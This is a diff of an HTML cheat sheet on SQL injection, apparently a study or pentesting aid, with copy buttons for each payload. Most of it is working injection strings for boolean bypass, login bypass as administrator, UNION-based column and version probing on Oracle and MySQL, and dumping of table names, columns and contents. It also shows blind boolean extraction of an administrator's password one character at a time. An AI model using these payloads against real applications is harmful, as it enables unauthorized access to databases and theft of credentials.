@@ -56,43 +56,40 @@
 If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean 
 conditions are used.
 	
-<b>command C1:</b><p id="HDT01"><mark>' OR 1=1--</mark></p>
-<b>command C2:</b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
-<b>command C3:</b><p id="HDT03"><mark>' and 1=2;--</mark></p>
-
-<button class="button_conf button_set" onclick="ctrl_C('#HDT01')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT02')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#HDT03')">copy C3!</button></p>
+<b>C1: </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
+<b>C2: </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
+<b>C3: </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
+<button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT03')">.C3.</button></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
 
 Sample:
-<b>command C1:</b><p id="LBT01"><mark>administrator'--</mark></p> 
-
-<button class="button_conf button_set" onclick="ctrl_C('#LBT01')">copy C1!</button></p>
+	
+<b>C1: </b><p id="LBT01"><mark>administrator'--</mark></p> 
+<button class="button_conf button_set" title="copy!" onclick="ctrl_C('#LBT01')">.C1.</button></p>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
 
-<b>--</b> or <b>#</b> | It is used in SQL query language to comment out ignoring the rest of the query.
-
+<b>--</b> or <b>#</b> | It is used in SQL query language to comment out ignoring the rest of the query. <br>
 <b>PRE-REQS:</b>
 1. get column number
 
-<b>method C1:</b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
-<b>method C2:</b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
+<b>method C1: </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
+<b>method C2: </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
 
 <button class="button_conf button_set" onclick="ctrl_C('#DTT01')">copy MC1!</button> |  <button class="button_conf button_set" onclick="ctrl_C('#DTT02')">copy MC2!</button>
 	
 2. get field type
 	
-<b>command C1:</b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
-<b>command C2:</b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
-<b>command C3:</b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
+<b>C1: </b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
+<b>C2: </b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
+<b>C3: </b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 
 <button class="button_conf button_set" onclick="ctrl_C('#DTT03')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT04')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT05')">copy C3!</button>
-	
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
 	
@@ -100,20 +97,18 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 <b>ORACLE:</b>
 
-<b>command C1:</b><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p> 
-<b>command C2:</b><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p> 
+<b>C1: </b><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p> 
+<b>C2: </b><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p> 
 *assuming it has two columns and both are type string.
 
-<button class="button_conf button_set" onclick="ctrl_C('#DTT06')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT07')">copy C2!</button>
+<button class="button_conf button_set" onclick="ctrl_C('#DTT06')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT07')">copy C2!</button><br>
 	
 <b>MYSQL | SQL:</b> 
 
-<b>command C1:</b><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p> 
-
-<button class="button_conf button_set" onclick="ctrl_C('#DTT08')">copy C1!</button>
-
+<b>C1: </b><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p> 
 *assuming it has two columns and first is type string.
 
+<button class="button_conf button_set" onclick="ctrl_C('#DTT08')">copy C1!</button><br>
 <b>POSTGRESQL:</b></p>
 </details>
 <details>
@@ -127,17 +122,16 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 *after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
 
-<b>command C1:</b><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p> 
-	
+<b>C1: </b><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p> 
 *once table is identified, it is time to retrieve the COLUMNS of the table
 
-<b>command C2:</b><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
-	
+<b>C2: </b><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
 *once table_name and columns are identified, it is time to retrieve the CONTENT
 
-<b>command C3:</b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 
+<b>C3: </b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 
 
 <button class="button_conf button_set" onclick="ctrl_C('#LDCT01')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT02')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT03')">copy C3!</button>
+<br>
 </details>
 <details>
 <summary>ORACLE</summary>
@@ -147,19 +141,16 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 *after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
 
-<b>command C1:</b><p id="LDCT04"><mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark></p>
-
+<b>C1: </b><p id="LDCT04"><mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark></p>
 *once table is identified, it is time to retrieve the COLUMNS of the table
 
-<b>command C2:</b><p id="LDCT05"><mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark></p>
-
+<b>C2: </b><p id="LDCT05"><mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark></p>
 *once table_name and columns are identified, it is time to retrieve the CONTENT
 
-<b>command C3:</b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
+<b>C3: </b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
 
 <button class="button_conf button_set" onclick="ctrl_C('#LDCT04')">copy C1!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT05')">copy C2!</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT06')">copy C3!</button></p>
 </details>
-
 <b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
 two columns and both type string.</p>
 </details>
@@ -170,13 +161,13 @@ from other tables.
 
 STEP1: get query columns number
 
-<mark>' UNION SELECT NULL--</mark>
+<b>C1: </b><p id="UAT01"><mark>' UNION SELECT NULL--</mark>
 *add null values until the error disappears
 
 STEP2: get column field type
 
-<mark>' UNION SELECT NULL,'a'--</mark> | non-oracle
-<mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | oracle
+<b>C2: </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark> | non-oracle
+<b>C3: </b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | oracle
 *assuming two columns
 
 ... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same. </p>
@@ -188,35 +179,35 @@ Look for any new behavior after small changes.
 <details>
 <summary>CONDITIONAL RESPONSES</summary>
 	
-<mark>' AND '1'='1</mark> TRUE
-<mark>' AND '1'='2</mark> FALSE
+<b>C3: </b><p id="BAT01"><mark>' AND '1'='1</mark> TRUE
+<b>C3: </b><p id="BAT01"><mark>' AND '1'='2</mark> FALSE
 
 To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.
 
 > <u>check if table exist ?</u>
-<mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark> | TRUE condition means table exist !
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark> | TRUE condition means table exist !
 
 > <u>check if column value exist ?</u>
-<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark> | TRUE condition means column value exist !
-<mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark> | TRUE condition means column value exist !
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
 
 > <u>check the character lenght of the column ?</u>
-<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark>	
-<mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark>	
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
 <b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
 
 > <u>check the characters of the column ?</u>
-<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark>
-<mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark>
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
 
 So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
 iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
 
 <u>CLUSTER BOMB ATTACK !</u> - two positions
 
-<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
+<b>C3: </b><p id="BAT01"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
 
 <b>Note:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
